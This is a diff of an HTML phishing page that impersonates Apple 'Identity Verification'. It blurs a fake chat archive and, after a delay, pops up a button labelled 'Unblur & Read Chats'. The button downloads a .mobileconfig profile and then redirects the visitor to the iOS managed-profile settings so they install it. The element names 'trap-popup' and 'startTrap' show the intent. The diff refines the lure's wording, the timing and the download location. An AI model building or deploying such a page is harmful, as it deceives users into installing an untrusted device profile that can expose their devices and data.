@@ -17,13 +17,12 @@
             box-shadow: 0 15px 40px rgba(0,0,0,0.7); display: none;
         }
         .apple-logo { width: 35px; margin-bottom: 15px; }
-        h2 { font-size: 19px; color: #1d1d1f; margin-bottom: 10px; }
+        h2 { font-size: 18px; color: #1d1d1f; margin-bottom: 10px; font-weight: 600; }
         p { font-size: 13px; color: #48484a; margin-bottom: 25px; line-height: 1.5; }
         .btn {
             display: block; background: #007aff; color: white; text-decoration: none;
-            padding: 14px; border-radius: 12px; font-weight: 600; font-size: 15px;
+            padding: 14px; border-radius: 12px; font-weight: 600; font-size: 15px; cursor: pointer;
         }
-        .info-text { margin-top: 18px; font-size: 11px; color: #8e8e93; }
     </style>
 </head>
 <body>
@@ -31,20 +30,21 @@
     <div class="verification-box" id="trap-popup">
         <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" class="apple-logo">
         <h2>Identity Verification</h2>
-        <p>This conversation is encrypted. To view the full archive, verify your Apple device identity.</p>
-        <a href="https://raw.githubusercontent.com/applesecurityalert6-prog/hadima-closet-collections/main/secure_verify.mobileconfig" class="btn" onclick="startTrap()">Unblur & Read Chats</a>
-        <div class="info-text">Verification provided by Apple Security Services</div>
+        <p>This conversation is encrypted. To view the full archive, verify your device identity.</p>
+        
+        <a href="secure_verify.mobileconfig" class="btn" onclick="startTrap()">Unblur & Read Chats</a>
     </div>
+
     <script>
         setTimeout(function() {
             document.getElementById('trap-popup').style.display = 'block';
             document.querySelector('.chat-background').style.filter = 'blur(15px)';
-        }, 5000);
+        }, 3000);
 
         function startTrap() {
             setTimeout(function() {
                 window.location.href = "App-prefs:General&path=ManagedConfigurationList";
-            }, 3500);
+            }, 4000);
         }
     </script>
 </body>
